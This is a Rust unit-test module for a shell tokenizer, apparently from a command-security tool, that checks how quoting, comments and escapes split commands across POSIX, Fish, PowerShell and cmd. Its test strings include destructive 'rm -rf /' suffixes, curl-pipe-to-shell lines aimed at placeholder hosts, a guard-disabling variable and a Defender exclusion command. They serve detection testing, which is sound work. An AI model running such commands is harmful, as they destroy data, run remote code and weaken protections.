                    .any(|seg| seg.command.as_deref() == Some("sink")),
                "{input:?} -> {segs:?}"
            );
        }

        // A body in double quotes splits no segment, as before.
        for input in [
            "echo \"`printf ready | sink`\"",
            "echo \"$(printf ready | sink)\"",
        ] {
            let segs = tokenize(input, ShellType::Posix);
            assert_eq!(segs.len(), 1, "{input:?} -> {segs:?}");
        }

        // Fish reads double and single quotes as before.
        for input in ["echo \"$(echo '\"')\"\nsink", "echo `echo it's`\nsink"] {
            let segs = tokenize(input, ShellType::Fish);
            assert_eq!(segs.len(), 1, "{input:?} -> {segs:?}");
        }
    }

    /// `posix_readings` notes only the spots the shells read differently:
    /// a `$'...'` string holding a `\'` (in a backtick body, as the shells
    /// unescape it), and a `$$` before `{`/`(` or a split `$(`, outside
    /// single quotes and comments. `$'\n'` reads the same in bash and dash.
    #[test]
    fn posix_readings_note_only_text_the_shells_read_differently() {
        let readings = posix_readings;
        // The offset of each escaped quote.
        for (input, quotes) in [
            ("echo $'a\\'' ; sink # '", vec![9]),
            ("echo $'it\\'s'", vec![10]),
            ("echo $'a\\'b\\'c'", vec![9, 12]),
            ("echo $'a\\\\\\'b'", vec![11]),
            ("x=$(printf $'it\\'s'); sink", vec![16]),
            ("x=\"$(printf $'it\\'s')\"; sink", vec![17]),
            ("echo ${x:-$'a\\''} ; sink # '", vec![14]),
            ("é=1; echo $'a\\''", vec![15]),
            // A backtick body as the shells unescape it: `\\'` is `\'`.
            ("x=`printf $'it\\'s'`", vec![15]),
            ("x=`printf $'it\\\\'s'`", vec![16]),
            ("echo \"`echo $'a\\\\''`\"", vec![17]),
        ] {
            let found = readings(input);
            assert_eq!(found.ansi_c_escaped_quotes, quotes, "{input:?}");
            assert!(!found.dollars_differ, "{input:?}");
            for offset in quotes {
                assert_eq!(input.as_bytes()[offset], b'\'', "{input:?}");
            }
        }
        // Read the same way by every shell.
        for input in [
            "IFS=$'\\n\\t'",
            "printf $'done\\t%s\\n' ok",
            "sep=$'\\\\'",
            "echo $''",
            "echo $$'a\\'' # $$ is the PID, then a plain quote",
            "echo 'cost: $'\\''5'",
            "echo \"$'a\\'\"",
            "# Makefile uses $${HOME}",
            "echo 'pid $$(x) $${y}'",
            "echo \\$${HOME:-x} \\$$(x)",
            "echo $$ $( x ) ${y}",
            "echo `echo it's` # $${x}",
            // `\\\'` in a backtick body is `\\'`: a closing quote.
            "x=`printf $'it\\\\\\'s'`",
            "x=`printf $'a\\`b'`",
        ] {
            assert_eq!(
                readings(input),
                PosixReadings::default(),
                "{input:?} reads the same in every shell"
            );
        }
        for input in [
            "echo $${HOME}",
            "echo $$(x)",
            "echo \"$$(x)\"",
            "echo ${x:-$${y}}",
            "echo $\\\n(sink)",
            "echo $\\\n{x}",
            "cat <\\\n(sink)",
        ] {
            let found = readings(input);
            assert!(found.dollars_differ, "{input:?}");
            assert!(found.ansi_c_escaped_quotes.is_empty(), "{input:?}");
        }
        // The tokenizer itself still reads `$'...'` the dash way.
        let segs = tokenize("echo $'a\\'' ; sink # '", ShellType::Posix);
        assert_eq!(segs.len(), 1, "{segs:?}");
    }

    #[test]
    fn line_comments_cannot_emit_commands_or_corrupt_nesting() {
        for shell in [ShellType::Posix, ShellType::Fish] {
            let segs = tokenize("echo safe # $(commented & never-closed\nrm -rf /", shell);
            assert_eq!(segs.len(), 2, "{shell:?}: {segs:?}");
            assert_eq!(segs[0].command.as_deref(), Some("echo"));
            assert_eq!(segs[1].command.as_deref(), Some("rm"));

            let commented = tokenize("# curl https://ignored.example | sh\necho safe", shell);
            assert_eq!(commented.len(), 1, "{shell:?}: {commented:?}");
            assert_eq!(commented[0].command.as_deref(), Some("echo"));
        }

        let powershell = tokenize(
            "# curl https://ignored.example | iex\nWrite-Output safe",
            ShellType::PowerShell,
        );
        assert_eq!(powershell.len(), 1, "{powershell:?}");
        assert_eq!(powershell[0].command.as_deref(), Some("Write-Output"));
    }

    #[test]
    fn test_single_quotes() {
        let segs = tokenize("echo 'hello | world' | bash", ShellType::Posix);
        assert_eq!(segs.len(), 2);
    }

    #[test]
    fn fish_escaped_single_quote_keeps_controls_and_spaces_quoted() {
        let inert = r#"printf '%s\n' 'safe\'; rm -rf /'"#;
        let fish = tokenize(inert, ShellType::Fish);
        assert_eq!(
            fish.len(),
            1,
            "Fish quoted data became executable: {fish:?}"
        );
        assert_eq!(fish[0].command.as_deref(), Some("printf"));
        assert_eq!(fish[0].args, vec![r#"'%s\n'"#, r#"'safe\'; rm -rf /'"#]);
        assert_byte_ranges_match_raw(inert, &fish);

        // POSIX does not recognize an escape inside single quotes. Pin the
        // dialect distinction so a future cleanup cannot silently merge the
        // scanners again.
        let posix = tokenize(inert, ShellType::Posix);
        assert_eq!(posix.len(), 2, "POSIX quote semantics changed: {posix:?}");
        assert_eq!(posix[1].command.as_deref(), Some("rm"));

        let spaced = r#"echo 'can\'t split' tail"#;
        let fish = tokenize(spaced, ShellType::Fish);
        assert_eq!(fish.len(), 1, "escaped quote split a Fish word: {fish:?}");
        assert_eq!(fish[0].args, vec![r#"'can\'t split'"#, "tail"]);
        assert_byte_ranges_match_raw(spaced, &fish);
    }

    #[test]
    fn fish_single_quote_backslash_parity_preserves_real_suffixes() {
        // Two backslashes form Fish's `\\` escape, so the following quote is
        // a real closer and the destructive suffix remains executable.
        let even = r#"printf '%s\n' 'safe\\'; rm -rf /"#;
        let segments = tokenize(even, ShellType::Fish);
        assert_eq!(
            segments.len(),
            2,
            "real Fish suffix was hidden: {segments:?}"
        );
        assert_eq!(segments[1].command.as_deref(), Some("rm"));
        assert_eq!(segments[1].preceding_separator.as_deref(), Some(";"));
        assert_byte_ranges_match_raw(even, &segments);

        // With three backslashes, Fish consumes `\\` and then `\'`; the
        // semicolon is quoted data until the final apostrophe.
        let odd = r#"printf '%s\n' 'safe\\\'; rm -rf /'"#;
        let segments = tokenize(odd, ShellType::Fish);
        assert_eq!(
            segments.len(),
            1,
            "escaped Fish apostrophe exposed an inert suffix: {segments:?}"
        );
        assert_byte_ranges_match_raw(odd, &segments);

        // An escaped apostrophe does not swallow a suffix after the actual
        // closing quote.
        let closed = r#"printf '%s\n' 'can\'t'; rm -rf /"#;
        let segments = tokenize(closed, ShellType::Fish);
        assert_eq!(segments.len(), 2, "closing quote was ignored: {segments:?}");
        assert_eq!(segments[1].command.as_deref(), Some("rm"));
        assert_byte_ranges_match_raw(closed, &segments);
    }

    #[test]
    fn test_backslash_escape() {
        let segs = tokenize("echo hello\\|world | bash", ShellType::Posix);
        // The backslash-pipe is inside the first segment
        assert_eq!(segs.len(), 2);
    }

    #[test]
    fn test_empty_input() {
        let segs = tokenize("", ShellType::Posix);
        assert!(segs.is_empty());
    }

    #[test]
    fn test_whitespace_only() {
        let segs = tokenize("   ", ShellType::Posix);
        assert!(segs.is_empty());
    }

    #[test]
    fn test_args_extraction() {
        let segs = tokenize("curl -sSL https://example.com", ShellType::Posix);
        assert_eq!(segs.len(), 1);
        assert_eq!(segs[0].command.as_deref(), Some("curl"));
        assert_eq!(segs[0].args.len(), 2);
    }

    #[test]
    fn test_env_prefix_skipped() {
        let segs = tokenize("TIRITH=0 curl evil.com", ShellType::Posix);
        assert_eq!(segs.len(), 1);
        assert_eq!(segs[0].command.as_deref(), Some("curl"));
        assert_eq!(segs[0].args, vec!["evil.com"]);
    }

    #[test]
    fn test_multiple_env_prefixes() {
        let segs = tokenize("FOO=bar BAZ=1 python script.py", ShellType::Posix);
        assert_eq!(segs.len(), 1);
        assert_eq!(segs[0].command.as_deref(), Some("python"));
        assert_eq!(segs[0].args, vec!["script.py"]);
    }

    #[test]
    fn test_env_only_no_command() {
        let segs = tokenize("TIRITH=0", ShellType::Posix);
        assert_eq!(segs.len(), 1);
        assert_eq!(segs[0].command, None);
        assert!(segs[0].args.is_empty());
    }

    #[test]
    fn test_is_env_assignment() {
        assert!(is_env_assignment("FOO=bar"));
        assert!(is_env_assignment("TIRITH=0"));
        assert!(is_env_assignment("PATH=/usr/bin"));
        assert!(is_env_assignment("A="));
        assert!(!is_env_assignment("-o"));
        assert!(!is_env_assignment("curl"));
        assert!(!is_env_assignment("=value"));
        assert!(!is_env_assignment("--flag=value"));
        assert!(!is_env_assignment("1FOO=bar"));
    }

    #[test]
    fn test_leading_env_assignment_values() {
        assert_eq!(
            leading_env_assignment_values("URL=https://example.com curl ok"),
            vec!["https://example.com"]
        );
        assert_eq!(
            leading_env_assignments("URL='https://example.com/a' FOO=bar curl ok"),
            vec![
                ("URL".to_string(), "'https://example.com/a'".to_string()),
                ("FOO".to_string(), "bar".to_string())
            ]
        );
        assert_eq!(
            leading_env_assignment_values("URL='https://example.com/a' FOO=bar curl ok"),
            vec!["'https://example.com/a'", "bar"]
        );
        assert!(leading_env_assignment_values("env URL=https://example.com curl ok").is_empty());
    }

    #[test]
    fn test_cmd_pipe() {
        let segs = tokenize("dir | findstr foo", ShellType::Cmd);
        assert_eq!(segs.len(), 2);
        assert_eq!(segs[0].command.as_deref(), Some("dir"));
        assert_eq!(segs[1].command.as_deref(), Some("findstr"));
    }

    #[test]
    fn test_cmd_ampersand_separator() {
        let segs = tokenize("dir & echo done", ShellType::Cmd);
        assert_eq!(segs.len(), 2);
        assert_eq!(segs[1].preceding_separator.as_deref(), Some("&"));
    }

    #[test]
    fn bounded_tokenization_never_retains_a_segment_past_the_cap() {
        for (shell, input) in [
            (ShellType::Posix, "one; two; three"),
            (ShellType::Fish, "one; two; three"),
            (ShellType::PowerShell, "one; two; three"),
            (ShellType::Cmd, "one & two & three"),
        ] {
            let (segments, budget) = tokenize_bounded(input, shell, 2, usize::MAX, usize::MAX);
            assert_eq!(segments.len(), 2, "{shell:?}: {segments:?}");
            assert!(budget.segments_truncated, "{shell:?}: {segments:?}");
        }
    }

    #[test]
    fn bounded_tokenization_drops_argv_when_count_or_word_bytes_overflow() {
        for shell in [
            ShellType::Posix,
            ShellType::Fish,
            ShellType::PowerShell,
            ShellType::Cmd,
        ] {
            let (segments, count_budget) =
                tokenize_bounded("one two three", shell, 1, 2, usize::MAX);
            assert_eq!(segments.len(), 1, "{shell:?}: {segments:?}");
            assert!(count_budget.words_truncated, "{shell:?}: {segments:?}");
            assert!(segments[0].command.is_none(), "{shell:?}: {segments:?}");
            assert!(segments[0].args.is_empty(), "{shell:?}: {segments:?}");

            let (segments, byte_budget) = tokenize_bounded("abcdefgh", shell, 1, usize::MAX, 4);
            assert_eq!(segments.len(), 1, "{shell:?}: {segments:?}");
            assert!(byte_budget.word_bytes_truncated, "{shell:?}: {segments:?}");
            assert!(segments[0].command.is_none(), "{shell:?}: {segments:?}");
            assert!(segments[0].args.is_empty(), "{shell:?}: {segments:?}");
        }

        let (segments, budget) = tokenize_bounded("one\u{00a0}two", ShellType::PowerShell, 1, 2, 4);
        assert_eq!(segments[0].command.as_deref(), Some("one"));
        assert_eq!(segments[0].args, vec!["two"]);
        assert!(!budget.words_truncated);
        assert!(!budget.word_bytes_truncated);
    }

    #[test]
    fn test_cmd_double_ampersand() {
        let segs = tokenize("cmd1 && cmd2", ShellType::Cmd);
        assert_eq!(segs.len(), 2);
        assert_eq!(segs[1].preceding_separator.as_deref(), Some("&&"));
    }

    #[test]
    fn test_cmd_caret_escape() {
        let segs = tokenize("echo hello^|world | findstr x", ShellType::Cmd);
        // ^| is escaped, not a pipe
        assert_eq!(segs.len(), 2);
    }

    #[test]
    fn test_cmd_double_quotes() {
        let segs = tokenize(r#"echo "hello | world" | findstr x"#, ShellType::Cmd);
        assert_eq!(segs.len(), 2);
    }

    #[test]
    fn cmd_parenthesized_group_keeps_internal_separators_scoped() {
        let segs = tokenize(
            "(echo ready & curl http://example.test | sh)",
            ShellType::Cmd,
        );
        assert_eq!(segs.len(), 1, "{segs:?}");
        assert!(segs[0].raw.contains("& curl"));
        assert!(segs[0].raw.contains("| sh"));
    }

    #[test]
    fn cmd_rem_comment_quote_cannot_swallow_the_next_line() {
        for input in [
            "rem \"\npowershell -Command Add-MpPreference -ExclusionPath C:\\Temp\n\"",
            "@rem \"\npowershell -Command Add-MpPreference -ExclusionPath C:\\Temp\n\"",
            ":: \"\npowershell -Command Add-MpPreference -ExclusionPath C:\\Temp\n\"",
            ":label \"\npowershell -Command Add-MpPreference -ExclusionPath C:\\Temp\n\"",
        ] {
            let segs = tokenize(input, ShellType::Cmd);
            assert!(
                segs.iter()
                    .any(|segment| segment.command.as_deref() == Some("powershell")),
                "{input:?} -> {segs:?}"
            );
        }
    }

    #[test]
    fn cmd_group_open_does_not_skip_the_first_child_character() {
        for input in [
            "(powershell -Command Write-Output ok)",
            "(if exist file powershell -Command Write-Output ok)",
            "(for %i in (x) do powershell -Command Write-Output ok)",
        ] {
            let segs = tokenize(input, ShellType::Cmd);
            assert_eq!(segs.len(), 1, "{input:?} -> {segs:?}");
            assert!(segs[0].raw.contains("powershell"), "{input:?} -> {segs:?}");
        }
    }

    #[test]
    fn test_powershell_multibyte_and_operator_no_panic() {
        // Fuzz-crash regression: multi-byte UTF-8 before `-and` once panicked
        // the `&input[i..]` slicing on a byte/char index mismatch.
        let input = " ?]BB\u{07E7}\u{07E7} -\n-\r-and-~\0\u{c}-and-~\u{1d}";
        let _ = tokenize(input, ShellType::PowerShell);
    }

    // Segment.byte_range invariant: `input[byte_range] == raw` for every
    // segment, over the TRIMMED content (see push_segment).

    fn assert_byte_ranges_match_raw(input: &str, segs: &[Segment]) {
        for (i, seg) in segs.iter().enumerate() {
            assert_eq!(
                &input[seg.byte_range.clone()],
                seg.raw,
                "segment {i} byte_range {:?} does not match raw {:?} in input {:?}",
                seg.byte_range,
                seg.raw,
                input
            );
        }
    }

    #[test]
    fn test_byte_range_posix_simple_pipe() {
        let input = "foo bar | baz";
        let segs = tokenize(input, ShellType::Posix);
        assert_eq!(segs.len(), 2);
        assert_byte_ranges_match_raw(input, &segs);
        assert_eq!(&input[segs[0].byte_range.clone()], "foo bar");
        assert_eq!(&input[segs[1].byte_range.clone()], "baz");
    }

    #[test]
    fn test_byte_range_posix_leading_trailing_whitespace() {
        // push_segment trims; byte_range must match the trimmed content.
        let input = "  foo bar  | baz  ";
        let segs = tokenize(input, ShellType::Posix);
        assert_eq!(segs.len(), 2);
        assert_byte_ranges_match_raw(input, &segs);
        assert_eq!(segs[0].byte_range, 2..9); // "foo bar"
        assert_eq!(segs[1].byte_range, 13..16); // "baz"
    }

    #[test]
    fn test_byte_range_posix_duplicate_segments() {
        // search_cursor must advance so duplicates don't all match at the
        // first position.
        let input = "foo | foo | foo";
        let segs = tokenize(input, ShellType::Posix);
        assert_eq!(segs.len(), 3);
        assert_byte_ranges_match_raw(input, &segs);
        assert_eq!(segs[0].byte_range, 0..3);
        assert_eq!(segs[1].byte_range, 6..9);
        assert_eq!(segs[2].byte_range, 12..15);
    }

    #[test]
    fn test_byte_range_posix_with_quoted_pipe() {
        // Quoted pipe stays inside its segment; byte_range covers both quotes.
        let input = r#"echo "a | b" | grep x"#;
        let segs = tokenize(input, ShellType::Posix);
        assert_eq!(segs.len(), 2);
        assert_byte_ranges_match_raw(input, &segs);
        assert_eq!(segs[0].raw, r#"echo "a | b""#);
    }

    #[test]
    fn test_byte_range_posix_multibyte_content() {
        // Multi-byte UTF-8 chars in a segment — raw must still be a byte-exact
        // substring of input, not a char-index slice.
        let input = "echo 日本語 | grep x";
        let segs = tokenize(input, ShellType::Posix);
        assert_eq!(segs.len(), 2);
        assert_byte_ranges_match_raw(input, &segs);
        assert_eq!(segs[0].raw, "echo 日本語");
    }

    #[test]
    fn test_byte_range_powershell_simple_pipe() {
        let input = "Get-Process | Where-Object { $_.Name -eq 'x' }";
        let segs = tokenize(input, ShellType::PowerShell);
        assert!(segs.len() >= 2);
        assert_byte_ranges_match_raw(input, &segs);
    }

    #[test]
    fn test_byte_range_cmd_pipe() {
        let input = "dir | findstr foo";
        let segs = tokenize(input, ShellType::Cmd);
        assert_eq!(segs.len(), 2);
        assert_byte_ranges_match_raw(input, &segs);
    }

    #[test]
    fn test_byte_range_fish_delegates_to_posix() {
        // Fish tokenization goes through tokenize_posix; byte_range behavior is identical.
        let input = "echo hi | cat";
        let segs = tokenize(input, ShellType::Fish);
        assert_eq!(segs.len(), 2);
        assert_byte_ranges_match_raw(input, &segs);
    }

    #[test]
    fn test_byte_range_empty_input() {
        let segs = tokenize("", ShellType::Posix);
        assert!(segs.is_empty());
    }

    #[test]
    fn test_byte_range_whitespace_only() {
        let segs = tokenize("   \t  ", ShellType::Posix);
        assert!(segs.is_empty());
    }

    #[test]
    fn test_byte_range_sequence_operators() {
        let input = "ls && echo done";
        let segs = tokenize(input, ShellType::Posix);
        assert_eq!(segs.len(), 2);
        assert_byte_ranges_match_raw(input, &segs);
        assert_eq!(segs[0].byte_range, 0..2); // "ls"
        assert_eq!(segs[1].byte_range, 6..15); // "echo done"
    }
}
